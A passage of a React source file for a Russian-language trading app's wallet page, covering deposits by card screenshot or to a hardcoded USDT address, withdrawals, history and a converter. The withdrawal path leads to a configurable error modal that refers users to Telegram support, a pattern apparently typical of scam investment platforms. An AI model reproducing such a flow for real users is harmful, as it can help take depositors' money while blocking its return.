                                        <button onClick={() => openModal('withdraw')} className="flex-1 bg-[#1c1c1e] text-white rounded-2xl py-3 flex items-center justify-center gap-2 active:scale-[0.98] border border-white/5 font-semibold text-sm transition-all hover:border-white/10">
                                            <ArrowUpRight size={16} /> Вывести
                                        </button>
                                    </>
                                )}
                            </div>
                        </div>

                        {/* Stats Cards */}
                        {totalTrades > 0 && (
                            <div className="grid grid-cols-2 gap-3 mb-4">
                                <StatsCard 
                                    icon={<BarChart3 size={18} className="text-[#0098EA]" />}
                                    title={isDemoMode ? "Демо сделок" : "Всего сделок"}
                                    value={totalTrades.toString()}
                                    subtitle={`Винрейт ${winRate}%`}
                                    color={winRate >= 50 ? 'text-[#00C896]' : 'text-[#FF3B30]'}
                                />
                                <StatsCard 
                                    icon={<PieChart size={18} className="text-[#00C896]" />}
                                    title="Прибыльные"
                                    value={wins.toString()}
                                    subtitle={`Убыточные ${losses}`}
                                    color="text-[#FF3B30]"
                                />
                            </div>
                        )}

                        {/* Withdraw Requests */}
                        {withdrawRequests.length > 0 && (
                            <div className="bg-[#1c1c1e] rounded-2xl p-4 border border-white/5 mb-4">
                                <div className="text-xs text-gray-500 uppercase mb-3 flex items-center gap-2 tracking-wider">
                                    <Clock size={12} /> Заявки на вывод
                                </div>
                                {withdrawRequests.map(req => (
                                    <div key={req.id} className="flex items-center justify-between py-3 border-t border-white/5 first:border-t-0">
                                        <div>
                                            <span className="font-semibold">${req.amount}</span>
                                            <span className="text-xs text-gray-500 ml-2">{req.date}</span>
                                        </div>
                                        <div className={`flex items-center gap-1 text-xs font-medium px-2 py-1 rounded-lg ${
                                            req.status === 'pending' ? 'text-yellow-500 bg-yellow-500/10' :
                                            req.status === 'completed' ? 'text-[#00C896] bg-[#00C896]/10' : 'text-[#FF3B30] bg-[#FF3B30]/10'
                                        }`}>
                                            {req.status === 'pending' && <><Clock size={12} /> В обработке</>}
                                            {req.status === 'completed' && <><CheckCircle size={12} /> Выполнено</>}
                                            {req.status === 'rejected' && <><XCircle size={12} /> Отклонено</>}
                                        </div>
                                    </div>
                                ))}
                            </div>
                        )}

                        {/* Analytics: wins/losses donut */}
                        {totalTrades > 0 && (
                            <div className="space-y-3 mb-4">
                                <h3 className="text-sm font-semibold text-gray-400 uppercase tracking-wider">Аналитика сделок</h3>
                                <div className="bg-[#1c1c1e] rounded-2xl p-4 border border-white/5 flex flex-col sm:flex-row items-center gap-4">
                                    <div className="relative w-32 h-32 flex-shrink-0">
                                        <svg viewBox="0 0 36 36" className="w-full h-full -rotate-90">
                                            <path
                                                d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
                                                fill="none"
                                                stroke="#252527"
                                                strokeWidth="2.5"
                                            />
                                            <path
                                                d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
                                                fill="none"
                                                stroke="#00C896"
                                                strokeWidth="2.5"
                                                strokeDasharray={`${(wins / totalTrades) * 100}, 100`}
                                                strokeLinecap="round"
                                            />
                                            <path
                                                d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
                                                fill="none"
                                                stroke="#FF3B30"
                                                strokeWidth="2.5"
                                                strokeDasharray={`${(losses / totalTrades) * 100}, 100`}
                                                strokeDashoffset={`-${(wins / totalTrades) * 100}`}
                                                strokeLinecap="round"
                                            />
                                        </svg>
                                        <div className="absolute inset-0 flex items-center justify-center">
                                            <span className="text-lg font-bold text-white">{winRate}%</span>
                                        </div>
                                    </div>
                                    <div className="flex-1 flex flex-col gap-2">
                                        <div className="flex items-center justify-between">
                                            <span className="text-sm text-gray-400">Успешные</span>
                                            <span className="font-semibold text-[#00C896]">{wins}</span>
                                        </div>
                                        <div className="flex items-center justify-between">
                                            <span className="text-sm text-gray-400">Неуспешные</span>
                                            <span className="font-semibold text-[#FF3B30]">{losses}</span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        )}

                        {/* Demo Mode Info */}
                        {isDemoMode && (
                            <div className="bg-[#1c1c1e] rounded-2xl p-4 border border-white/5 text-center">
                                <div className="text-gray-400 text-sm mb-2">Демо режим активен</div>
                                <div className="text-xs text-gray-500">
                                    Торгуйте виртуальными средствами без риска. Для реальной торговли отключите демо режим в настройках.
                                </div>
                            </div>
                        )}
                    </div>
                )}

                {activeTab === 'history' && (
                    <div className="flex-1 min-h-0 overflow-y-auto px-4 pb-24" style={{ WebkitOverflowScrolling: 'touch' }}>
                        <div className="flex justify-between items-center mb-4">
                            <h2 className="font-semibold text-gray-400 uppercase tracking-wider text-sm">Операции</h2>
                            <span className="text-xs text-gray-500 bg-[#1c1c1e] px-2 py-1 rounded-lg">{history.length}</span>
                        </div>
                        
                        {history.length === 0 ? (
                            <div className="flex flex-col items-center justify-center py-16 text-gray-600">
                                <div className="w-16 h-16 rounded-2xl bg-[#1c1c1e] flex items-center justify-center mb-4 border border-white/5">
                                    <History size={24} className="opacity-50" />
                                </div>
                                <span className="text-sm font-medium">Нет операций</span>
                                <span className="text-xs text-gray-500 mt-1">История транзакций появится здесь</span>
                            </div>
                        ) : (
                            <div className="space-y-3">
                                {history.map(tx => (
                                    <div key={tx.id} className="bg-[#1c1c1e] p-4 rounded-2xl flex items-center justify-between border border-white/5 hover:border-white/10 transition-colors">
                                        <div className="flex items-center gap-3">
                                            <div className={`w-10 h-10 rounded-xl flex items-center justify-center ${
                                                tx.type === 'win' ? 'bg-[#00C896]/15 text-[#00C896] border border-[#00C896]/20' : 
                                                tx.type === 'loss' ? 'bg-[#FF3B30]/15 text-[#FF3B30] border border-[#FF3B30]/20' : 
                                                tx.type === 'deposit' ? 'bg-[#0098EA]/15 text-[#0098EA] border border-[#0098EA]/20' :
                                                'bg-[#1c1c1e] text-gray-400 border border-white/5'
                                            }`}>
                                                {tx.type === 'win' && <TrendingUp size={16} />}
                                                {tx.type === 'loss' && <TrendingDown size={16} />}
                                                {tx.type === 'deposit' && <ArrowDownLeft size={16} />}
                                                {tx.type === 'withdraw' && <ArrowUpRight size={16} />}
                                            </div>
                                            <div>
                                                <div className="text-sm font-semibold">
                                                    {tx.type === 'win' || tx.type === 'loss' ? tx.asset : 
                                                     tx.type === 'deposit' ? 'Пополнение' : 'Вывод'}
                                                </div>
                                                <div className="text-xs text-gray-500">{tx.amountUsd}</div>
                                            </div>
                                        </div>
                                        <div className="text-right">
                                            <div className={`text-sm font-bold ${
                                                tx.type === 'win' || tx.type === 'deposit' ? 'text-[#00C896]' : 'text-[#FF3B30]'
                                            }`}>{tx.amount}</div>
                                            <div className="text-xs text-gray-500">{tx.date}</div>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        )}
                    </div>
                )}

                {/* Top Traders */}
                {activeTab === 'top' && (
                    <TopTradersSection />
                )}
            </div>

            {/* Deposit Modal — стильное и удобное для телефона */}
            {activeModal === 'deposit' && (
                <div className="fixed inset-0 z-[100] flex items-end justify-center">
                    <div className="absolute inset-0 bg-black/70 backdrop-blur-[2px]" onClick={closeModal} />
                    <div 
                        className="bg-[#111113] w-full max-w-[420px] rounded-t-2xl relative z-10 flex flex-col animate-[slideUp_0.25s_ease-out] max-h-[92dvh] overflow-hidden"
                        style={{ paddingBottom: 'max(1rem, env(safe-area-inset-bottom))' }}
                    >
                        {/* Drag handle */}
                        <div className="shrink-0 pt-3 pb-1 flex justify-center">
                            <div className="w-9 h-1 bg-white/15 rounded-full" />
                        </div>
                        
                        {/* Header */}
                        <div className="shrink-0 px-4 pb-3 flex items-center justify-between">
                            {depositMethod ? (
                                <button 
                                    onClick={() => setDepositMethod(null)} 
                                    className="flex items-center gap-1.5 text-sm text-gray-400 hover:text-white active:opacity-70 transition-opacity min-h-[44px] min-w-[44px] -ml-2"
                                >
                                    <span className="text-lg">←</span>
                                    <span>Назад</span>
                                </button>
                            ) : (
                                <span />
                            )}
                            <h2 className="text-base font-semibold text-white">Пополнение</h2>
                            <button 
                                onClick={closeModal} 
                                className="p-2.5 rounded-full bg-white/5 text-gray-400 hover:text-white active:bg-white/10 transition-colors min-h-[44px] min-w-[44px] flex items-center justify-center"
                            >
                                <X size={18} strokeWidth={2} />
                            </button>
                        </div>

                        <div className="flex-1 min-h-0 overflow-y-auto overscroll-contain px-4" style={{ WebkitOverflowScrolling: 'touch' }}>
                        {!depositMethod ? (
                            <div className="space-y-2 pb-4">
                                <p className="text-xs text-gray-500 mb-3">Выберите способ пополнения</p>

                                <button 
                                    onClick={() => setDepositMethod('card')} 
                                    className="w-full bg-[#1a1a1c] p-4 rounded-2xl flex items-center gap-4 active:scale-[0.99] transition-transform border border-white/5 active:bg-white/5"
                                >
                                    <div className="w-11 h-11 rounded-xl bg-gradient-to-br from-[#EB001B] via-[#F79E1B] to-[#FF5F00] flex items-center justify-center">
                                        <CreditCard size={22} className="text-white" strokeWidth={2} />
                                    </div>
                                    <div className="text-left flex-1 min-w-0">
                                        <div className="font-semibold text-[15px]">Банковская карта</div>
                                        <div className="text-xs text-gray-500 mt-0.5">Visa, Mastercard, МИР · ~5 мин</div>
                                    </div>
                                    <span className="text-gray-500">→</span>
                                </button>

                                <button 
                                    onClick={() => setDepositMethod('crypto')} 
                                    className="w-full bg-[#1a1a1c] p-4 rounded-2xl flex items-center gap-4 active:scale-[0.99] transition-transform border border-white/5 active:bg-white/5"
                                >
                                    <div className="w-11 h-11 rounded-xl bg-[#26A17B] flex items-center justify-center">
                                        <Bitcoin size={22} className="text-white" strokeWidth={2} />
                                    </div>
                                    <div className="text-left flex-1 min-w-0">
                                        <div className="font-semibold text-[15px]">USDT (TRC20)</div>
                                        <div className="text-xs text-gray-500 mt-0.5">Криптовалюта · ~10 мин</div>
                                    </div>
                                    <span className="text-gray-500">→</span>
                                </button>
                            </div>
                        ) : depositMethod === 'crypto' ? (
                            <div className="space-y-4 pb-4">
                                <div className="text-center">
                                    <p className="text-sm text-gray-400 mb-3">Отправьте USDT в сети TRC20</p>
                                    <div className="w-44 h-44 mx-auto bg-white rounded-2xl p-2.5 mb-4">
                                        <div className="w-full h-full bg-[url('https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=TN3W4H6rK2ce4vX9YnFQHwKENnHjoxb3m9')] bg-contain bg-center bg-no-repeat rounded-lg" />
                                    </div>
                                    <div className="bg-[#1a1a1c] rounded-xl p-3 flex items-center gap-3 border border-white/5">
                                        <code className="text-[11px] text-gray-300 flex-1 break-all font-mono leading-relaxed">{cryptoAddresses.USDT}</code>
                                        <button 
                                            onClick={() => handleCopy(cryptoAddresses.USDT)} 
                                            className={`shrink-0 min-h-[44px] min-w-[44px] flex items-center justify-center rounded-xl transition-colors ${copied ? 'bg-[#00C896]/20 text-[#00C896]' : 'bg-white/10 text-gray-400 active:bg-white/15'}`}
                                        >
                                            {copied ? <Check size={18} /> : <Copy size={18} />}
                                        </button>
                                    </div>
                                    <p className="text-[11px] text-amber-400/90 mt-3 flex items-center justify-center gap-1.5">
                                        <AlertCircle size={12} />
                                        Только USDT TRC20 — другие токены потеряются
                                    </p>
                                </div>
                            </div>
                        ) : (
                            <div className="space-y-4 pb-4">
                                {/* Страна */}
                                <div>
                                    <label className="text-xs text-gray-500 mb-1.5 block">Страна</label>
                                    <select 
                                        value={selectedCountry} 
                                        onChange={e => setSelectedCountry(e.target.value)}
                                        className="w-full bg-[#1a1a1c] p-3.5 text-[15px] text-white rounded-xl border border-white/5 outline-none focus:border-[#0098EA]/40"
                                    >
                                        {countries.map(country => (
                                            <option key={country.name} value={country.name} className="bg-[#1c1c1e] text-white">
                                                {country.flag} {country.name} · {country.currency}
                                            </option>
                                        ))}
                                    </select>
                                </div>

                                {/* Сумма */}
                                <div>
                                    <label className="text-xs text-gray-500 mb-1.5 block">Сумма ({getCurrentCountry().currency})</label>
                                    <input 
                                        type="number" 
                                        inputMode="decimal"
                                        value={depositAmount} 
                                        onChange={e => setDepositAmount(e.target.value)} 
                                        className="w-full bg-[#1a1a1c] rounded-xl p-4 text-lg font-semibold outline-none border border-white/5 focus:border-[#0098EA]/50 text-white placeholder:text-gray-600" 
                                        placeholder={Math.ceil(minDeposit / getCurrentCountry().rate).toString()} 
                                    />
                                    <div className="flex flex-wrap gap-2 mt-2">
                                        {[Math.ceil(minDeposit / getCurrentCountry().rate), 500, 1000, 2500, 5000, 10000].map(v => (
                                            <button
                                                key={v}
                                                type="button"
                                                onClick={() => setDepositAmount(v.toString())}
                                                className="px-3 py-1.5 rounded-lg text-xs font-medium bg-white/5 text-gray-400 hover:bg-white/10 hover:text-white active:bg-white/15 transition-colors"
                                            >
                                                {v >= 1000 ? `${v/1000}K` : v}
                                            </button>
                                        ))}
                                    </div>
                                    <p className="text-xs text-gray-500 mt-2">
                                        ≈ ${(parseFloat(depositAmount || '0') * getCurrentCountry().rate).toFixed(2)} USDT
                                        {parseFloat(depositAmount || '0') * getCurrentCountry().rate < minDeposit && (
                                            <span className="text-amber-400 ml-1">· Мин. ${minDeposit}</span>
                                        )}
                                    </p>
                                </div>

                                {/* Реквизиты */}
                                <div className="bg-[#1a1a1c] rounded-xl p-4 border border-white/5">
                                    <p className="text-xs text-[#0098EA] font-medium mb-2">Реквизиты для {getCurrentCountry().name}</p>
                                    <div className="flex gap-3 items-start">
                                        <pre className="text-[12px] text-gray-300 flex-1 whitespace-pre-wrap break-words font-sans leading-relaxed">
                                            {getCurrentBankDetails()}
                                        </pre>
                                        <button 
                                            onClick={() => handleCopy(getCurrentBankDetails())} 
                                            className={`shrink-0 min-h-[44px] min-w-[44px] flex items-center justify-center rounded-xl transition-colors ${copied ? 'bg-[#00C896]/20 text-[#00C896]' : 'bg-white/10 text-gray-400 active:bg-white/15'}`}
                                        >
                                            {copied ? <Check size={18} /> : <Copy size={18} />}
                                        </button>
                                    </div>
                                    <p className="text-[11px] text-gray-500 mt-2">
                                        {getCurrentCountry().name === 'Россия' ? 'СБП или перевод на карту' :
                                         getCurrentCountry().name === 'Казахстан' ? 'Kaspi или банковская карта' :
                                         getCurrentCountry().name === 'Узбекистан' ? 'Uzcard или Humo' :
                                         getCurrentCountry().name === 'Киргизия' ? 'Банковская карта' :
                                         getCurrentCountry().name === 'Таджикистан' ? 'Банковская карта' :
                                         getCurrentCountry().name === 'США' ? 'Wire, ACH' : 'SEPA, карта'}
                                    </p>
                                </div>

                                {/* Скриншот */}
                                <div>
                                    <label className="text-xs text-gray-500 mb-1.5 block">Скриншот перевода</label>
                                    {!screenshotPreview ? (
                                        <label className="flex flex-col items-center justify-center min-h-[120px] bg-[#1a1a1c] border-2 border-dashed border-white/10 rounded-xl cursor-pointer active:bg-white/5 transition-colors">
                                            <div className="w-10 h-10 rounded-full bg-[#0098EA]/15 flex items-center justify-center mb-2">
                                                <Plus size={20} className="text-[#0098EA]" strokeWidth={2} />
                                            </div>
                                            <span className="text-sm font-medium text-gray-400">Нажмите для загрузки</span>
                                            <span className="text-[11px] text-gray-600 mt-0.5">JPG, PNG до 10 МБ</span>
                                            <input type="file" accept="image/*" onChange={handleScreenshotUpload} className="hidden" />
                                        </label>
                                    ) : (
                                        <div className="relative rounded-xl overflow-hidden border border-white/5">
                                            <img src={screenshotPreview} alt="Скриншот" className="w-full h-40 object-cover" />
                                            <button
                                                onClick={removeScreenshot}
                                                className="absolute top-2 right-2 w-9 h-9 bg-black/60 rounded-full flex items-center justify-center text-white active:bg-black/80"
                                            >
                                                <X size={16} />
                                            </button>
                                            <div className="absolute bottom-2 left-2 right-2 truncate text-xs text-white/90 bg-black/50 rounded-lg px-2 py-1">
                                                {uploadedScreenshot?.name}
                                            </div>
                                        </div>
                                    )}
                                </div>

                                {/* Кнопка отправки */}
                                <button 
                                    onClick={submitDeposit} 
                                    disabled={depositMethod === 'card' && !uploadedScreenshot}
                                    className={`w-full min-h-[52px] font-semibold text-[15px] rounded-xl active:scale-[0.99] transition-all ${
                                        depositMethod === 'card' && !uploadedScreenshot 
                                            ? 'bg-white/5 text-gray-500 cursor-not-allowed' 
                                            : 'bg-[#00C896] text-black'
                                    }`}
                                >
                                    {depositMethod === 'card' && !uploadedScreenshot ? 'Прикрепите скриншот' : 'Я перевёл средства'}
                                </button>
                            </div>
                        )}
                        </div>
                    </div>
                </div>
            )}

            {/* Withdraw Modal — стильное окно как пополнение */}
            {activeModal === 'withdraw' && (
                <div className="fixed inset-0 z-[100] flex items-end justify-center">
                    <div className="absolute inset-0 bg-black/70 backdrop-blur-[2px]" onClick={closeModal} />
                    <div 
                        className="bg-[#111113] w-full max-w-[420px] rounded-t-2xl relative z-10 flex flex-col animate-[slideUp_0.25s_ease-out] max-h-[92dvh] overflow-hidden"
                        style={{ paddingBottom: 'max(1rem, env(safe-area-inset-bottom))' }}
                    >
                        <div className="shrink-0 pt-3 pb-1 flex justify-center">
                            <div className="w-9 h-1 bg-white/15 rounded-full" />
                        </div>
                        <div className="shrink-0 px-4 pb-3 flex items-center justify-between">
                            <span />
                            <h2 className="text-base font-semibold text-white">Вывод средств</h2>
                            <button onClick={closeModal} className="p-2.5 rounded-full bg-white/5 text-gray-400 hover:text-white active:bg-white/10 min-h-[44px] min-w-[44px] flex items-center justify-center">
                                <X size={18} strokeWidth={2} />
                            </button>
                        </div>

                        <div className="flex-1 min-h-0 overflow-y-auto overscroll-contain px-4" style={{ WebkitOverflowScrolling: 'touch' }}>
                            {/* Баланс */}
                            <div className="flex items-center gap-3 bg-[#1a1a1c] p-4 rounded-xl border border-white/5 mb-4">
                                <div className="w-10 h-10 rounded-xl bg-[#26A17B] flex items-center justify-center">
                                    <UsdtIcon size={20} />
                                </div>
                                <div>
                                    <div className="text-sm font-semibold">Доступно</div>
                                    <div className="text-lg font-bold text-[#00C896]">${balance.toFixed(2)}</div>
                                </div>
                            </div>

                            {/* Способ вывода */}
                            <div className="mb-4">
                                <label className="text-xs text-gray-500 mb-2 block">Способ вывода</label>
                                <div className="grid grid-cols-2 gap-2">
                                    <button 
                                        onClick={() => setWithdrawAddress('')}
                                        className={`p-3.5 rounded-xl flex items-center gap-2 transition-colors border ${
                                            !withdrawAddress.startsWith('T') && !withdrawAddress.startsWith('0x') 
                                                ? 'border-[#0098EA]/50 bg-[#0098EA]/10' 
                                                : 'border-white/5 bg-[#1a1a1c] active:bg-white/5'
                                        }`}
                                    >
                                        <CreditCard size={18} className="text-[#F7931A]" />
                                        <span className="text-sm font-medium">Карта</span>
                                    </button>
                                    <button 
                                        onClick={() => setWithdrawAddress('T')}
                                        className={`p-3.5 rounded-xl flex items-center gap-2 transition-colors border ${
                                            withdrawAddress.startsWith('T') || withdrawAddress.startsWith('0x')
                                                ? 'border-[#0098EA]/50 bg-[#0098EA]/10' 
                                                : 'border-white/5 bg-[#1a1a1c] active:bg-white/5'
                                        }`}
                                    >
                                        <Bitcoin size={18} className="text-[#26A17B]" />
                                        <span className="text-sm font-medium">USDT TRC20</span>
                                    </button>
                                </div>
                            </div>

                            {/* Реквизиты */}
                            {withdrawAddress.startsWith('T') || withdrawAddress.startsWith('0x') ? (
                                <div className="mb-4">
                                    <label className="text-xs text-gray-500 mb-1.5 block">Адрес кошелька</label>
                                    <div className="bg-[#1a1a1c] rounded-xl p-3.5 flex items-center border border-white/5 focus-within:border-[#0098EA]/40">
                                        <Wallet className="text-gray-500 mr-2 shrink-0" size={18} />
                                        <input 
                                            type="text" 
                                            value={withdrawAddress} 
                                            onChange={e => setWithdrawAddress(e.target.value)} 
                                            placeholder="T..." 
                                            className="bg-transparent text-white font-mono text-sm outline-none w-full" 
                                        />
                                    </div>
                                    <p className="text-[11px] text-gray-500 mt-1">Только сеть TRC20</p>
                                </div>
                            ) : (
                                <div className="mb-4">
                                    <label className="text-xs text-gray-500 mb-1.5 block">Номер карты</label>
                                    <div className="bg-[#1a1a1c] rounded-xl p-3.5 flex items-center border border-white/5 focus-within:border-[#0098EA]/40">
                                        <CreditCard className="text-gray-500 mr-2 shrink-0" size={18} />
                                        <input 
                                            type="text" 
                                            inputMode="numeric"
                                            value={withdrawAddress} 
                                            onChange={e => setWithdrawAddress(e.target.value.replace(/\D/g, '').slice(0, 19))} 
                                            placeholder="2200 0000 0000 0000" 
                                            className="bg-transparent text-white font-mono text-sm outline-none w-full tracking-wider" 
                                        />
                                    </div>
                                </div>
                            )}

                            {/* Сумма */}
                            <div className="mb-4">
                                <label className="text-xs text-gray-500 mb-1.5 block">Сумма (USD)</label>
                                <div className={`bg-[#1a1a1c] rounded-xl p-4 flex items-center border transition-colors ${withdrawError ? 'border-[#FF3B30]/50' : 'border-white/5 focus-within:border-[#0098EA]/40'}`}>
                                    <input 
                                        type="number" 
                                        inputMode="decimal"
                                        placeholder="0" 
                                        className="bg-transparent text-white text-lg font-semibold outline-none w-full" 
                                        value={withdrawAmount} 
                                        onChange={e => { setWithdrawAmount(e.target.value); setWithdrawError(null); }} 
                                    />
                                    <span className="text-gray-500 text-sm">$</span>
                                </div>
                                {withdrawError && (
                                    <div className="flex items-center gap-2 mt-2 text-xs text-[#FF3B30] bg-[#FF3B30]/10 p-2.5 rounded-xl">
                                        <AlertCircle size={14} />
                                        {withdrawError}
                                    </div>
                                )}
                                <p className="text-[11px] text-gray-500 mt-1.5">
                                    Комиссия: {withdrawAddress.startsWith('T') || withdrawAddress.startsWith('0x') ? '2' : '1'} USDT
                                </p>
                            </div>

                            <button 
                                onClick={submitWithdraw} 
                                className="w-full min-h-[52px] font-semibold text-[15px] rounded-xl bg-[#0098EA] text-white active:scale-[0.99] transition-all"
                            >
                                Подтвердить вывод
                            </button>
                        </div>
                    </div>
                </div>
            )}

            {/* Withdraw Approved — успешное одобрение с анимацией */}
            {activeModal === 'withdraw-approved' && (
                <div className="fixed inset-0 z-[110] flex items-center justify-center px-4">
                    <div className="absolute inset-0 bg-black/80" />
                    <div className="relative z-10 bg-[#111113] w-full max-w-[340px] rounded-2xl p-8 border border-white/10 animate-[scaleIn_0.2s_ease-out] text-center">
                        <div className="w-20 h-20 mx-auto mb-4 rounded-full bg-[#00C896]/20 flex items-center justify-center animate-[scaleIn_0.3s_ease-out_0.1s_both]">
                            <CheckCircle size={48} className="text-[#00C896]" strokeWidth={2} />
                        </div>
                        <h3 className="text-xl font-bold text-white mb-1">Вывод одобрен</h3>
                        <p className="text-sm text-gray-400 mb-2">
                            −${parseFloat(withdrawAmount || '0').toFixed(2)} списано с баланса
                        </p>
                        <p className="text-xs text-gray-500">
                            Средства будут зачислены в ближайшее время
                        </p>
                        <div className="mt-6 h-1 w-24 mx-auto rounded-full bg-[#00C896]/30 overflow-hidden">
                            <div 
                                className="h-full w-full bg-[#00C896] rounded-full origin-left"
                                style={{ animation: 'shrinkBar 2.5s linear forwards' }}
                            />
                        </div>
                    </div>
                </div>
            )}

            {/* Converter Modal */}
            {activeModal === 'converter' && (
                <div className="fixed inset-0 z-[100] flex items-center justify-center px-4">
                    <div className="absolute inset-0 bg-black/90 backdrop-blur-sm" onClick={closeModal}></div>
                    <div className="bg-[#1c1c1e] w-full max-w-sm rounded-3xl border border-white/10 relative z-10 p-6 animate-[scaleIn_0.2s_ease-out]">
                        <div className="flex justify-between items-center mb-6">
                            <h2 className="text-lg font-bold flex items-center gap-2">
                                <RefreshCw size={18} className="text-[#0098EA]" />
                                Конвертер
                            </h2>
                            <button onClick={closeModal} className="p-2 bg-[#1c1c1e] rounded-xl text-gray-400 hover:text-white transition-colors border border-white/5">
                                <X size={18} />
                            </button>
                        </div>

                        <div className="space-y-4">
                            <div className="bg-[#1c1c1e] rounded-2xl p-4 border border-white/5">
                                <div className="flex justify-between items-center mb-3">
                                    <span className="text-xs text-gray-500 uppercase tracking-wider">Отдаю</span>
                                    <div className="flex items-center gap-2">
                                        {getCryptoIcon(convertFrom, 16)}
                                        <select 
                                            value={convertFrom} 
                                            onChange={e => setConvertFrom(e.target.value)} 
                                            className="bg-transparent text-sm font-semibold outline-none"
                                        >
                                            <option value="RUB">RUB</option>
                                            <option value="USDT">USDT</option>
                                            <option value="BTC">BTC</option>
                                            <option value="ETH">ETH</option>
                                        </select>
                                    </div>
                                </div>
                                <input 
                                    type="number" 
                                    value={convertAmount} 
                                    onChange={e => setConvertAmount(e.target.value)} 
                                    className="w-full bg-transparent text-2xl font-bold outline-none" 
                                />
                            </div>

                            <div className="flex justify-center">
                                <button 
                                    onClick={() => { const t = convertFrom; setConvertFrom(convertTo); setConvertTo(t); }} 
                                    className="w-12 h-12 rounded-2xl bg-[#1c1c1e] flex items-center justify-center text-gray-400 hover:text-white transition-all active:scale-95 border border-white/5 hover:border-white/10"
                                >
                                    <RefreshCw size={18} />
                                </button>
                            </div>

                            <div className="bg-[#1c1c1e] rounded-2xl p-4 border border-white/5">
                                <div className="flex justify-between items-center mb-3">
                                    <span className="text-xs text-gray-500 uppercase tracking-wider">Получаю</span>
                                    <div className="flex items-center gap-2">
                                        {getCryptoIcon(convertTo, 16)}
                                        <select 
                                            value={convertTo} 
                                            onChange={e => setConvertTo(e.target.value)} 
                                            className="bg-transparent text-sm font-semibold outline-none"
                                        >
                                            <option value="USDT">USDT</option>
                                            <option value="RUB">RUB</option>
                                            <option value="BTC">BTC</option>
                                            <option value="ETH">ETH</option>
                                        </select>
                                    </div>
                                </div>
                                <div className="text-2xl font-bold text-[#00C896]">{getConvertedAmount()}</div>
                            </div>

                            <div className="text-center text-xs text-gray-500 bg-[#1c1c1e] p-3 rounded-2xl border border-white/5">
                                Курс: 1 {convertFrom} = {rates[`${convertFrom}_${convertTo}`] || '—'} {convertTo}
                            </div>
                        </div>
                    </div>
                </div>
            )}

            {/* Processing Modal */}
            {activeModal === 'processing' && (
                <div className="fixed inset-0 z-[100] flex items-center justify-center px-4">
                    <div className="absolute inset-0 bg-black/90 backdrop-blur-sm"></div>
                    <div className="bg-[#1c1c1e] w-full max-w-sm rounded-3xl border border-white/10 relative z-10 p-8 animate-[scaleIn_0.2s_ease-out]">
                        <div className="flex flex-col items-center text-center">
                            <div className="w-16 h-16 border-4 border-[#0098EA] border-t-transparent rounded-full animate-spin mb-4"></div>
                            <h3 className="text-lg font-bold mb-2">Обработка запроса</h3>
                            <p className="text-sm text-gray-400">Проверяем данные для вывода средств...</p>
                        </div>
                    </div>
                </div>
            )}

            {/* Withdraw Error Modal */}
            {activeModal === 'withdraw-error' && (
                <div className="fixed inset-0 z-[100] flex items-center justify-center px-4">
                    <div className="absolute inset-0 bg-black/90 backdrop-blur-sm" onClick={closeModal}></div>
                    <div className="bg-[#1c1c1e] w-full max-w-sm rounded-3xl border border-white/10 relative z-10 p-6 animate-[scaleIn_0.2s_ease-out]">
                        <div className="flex flex-col items-center text-center">
                            <div className="w-16 h-16 rounded-2xl bg-[#FF3B30]/15 flex items-center justify-center mb-4 border border-[#FF3B30]/20">
                                <span className="text-3xl">{withdrawMessage?.icon || '⚠️'}</span>
                            </div>
                            
                            <h3 className="text-lg font-bold mb-2">{withdrawMessage?.title || 'Вывод невозможен'}</h3>
                            
                            <p className="text-sm text-gray-400 mb-4 leading-relaxed">
                                {withdrawMessage?.description || 'Вывод средств возможен только на те реквизиты, с которых производилось пополнение счета.'}
                            </p>

                            <p className="text-sm text-gray-300 mb-6">
                                Для получения дополнительной информации обратитесь в службу поддержки
                            </p>

                            <div className="flex gap-3 w-full">
                                <button 
                                    onClick={closeModal}
                                    className="flex-1 bg-[#1c1c1e] text-white font-semibold py-3 rounded-2xl active:scale-[0.98] border border-white/5 transition-all"
                                >
                                    Закрыть
                                </button>
                                <a 
                                    href={`https://t.me/${settings.support_username?.replace('@', '')}`}
                                    target="_blank"
                                    rel="noopener noreferrer"
                                    className="flex-1 bg-[#0098EA] text-white font-semibold py-3 rounded-2xl active:scale-[0.98] flex items-center justify-center gap-2 transition-all shadow-[0_4px_20px_rgba(0,152,234,0.2)]"
                                >
                                    {withdrawMessage?.button_text || 'Поддержка'}
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
};

const StatsCard = memo(({ 
  icon, 
  title, 
  value, 
  subtitle, 
  color = "text-gray-500"
}: { 
  icon: React.ReactNode, 
  title: string, 
  value: string, 
  subtitle: string, 
  color?: string
}) => (
  <div className="bg-[#1c1c1e] p-4 rounded-2xl border border-white/5 hover:border-white/10 transition-colors">
    <div className="flex items-center gap-3 mb-2">
      {icon}
      <div className="font-semibold text-sm text-white">{title}</div>
    </div>
    <div className="text-xl font-bold text-white mb-1">{value}</div>
    <div className={`text-xs font-medium ${color}`}>{subtitle}</div>
  </div>
));

const QuickActionCard = memo(({ 
  icon, 
  title, 
  subtitle, 
  onClick 
}: { 
  icon: React.ReactNode, 
  title: string, 
  subtitle: string, 
  onClick?: () => void
}) => (
  <div 
    onClick={onClick}
    className="bg-[#1c1c1e] p-4 rounded-2xl border border-white/5 hover:border-white/10 transition-all active:scale-[0.98] cursor-pointer group"
  >
    <div className="flex items-center gap-3 mb-2">
      {icon}
      <div className="font-semibold text-sm text-white">{title}</div>
    </div>
    <div className="text-xs text-gray-500">{subtitle}</div>
  </div>
));

export default WalletPage;
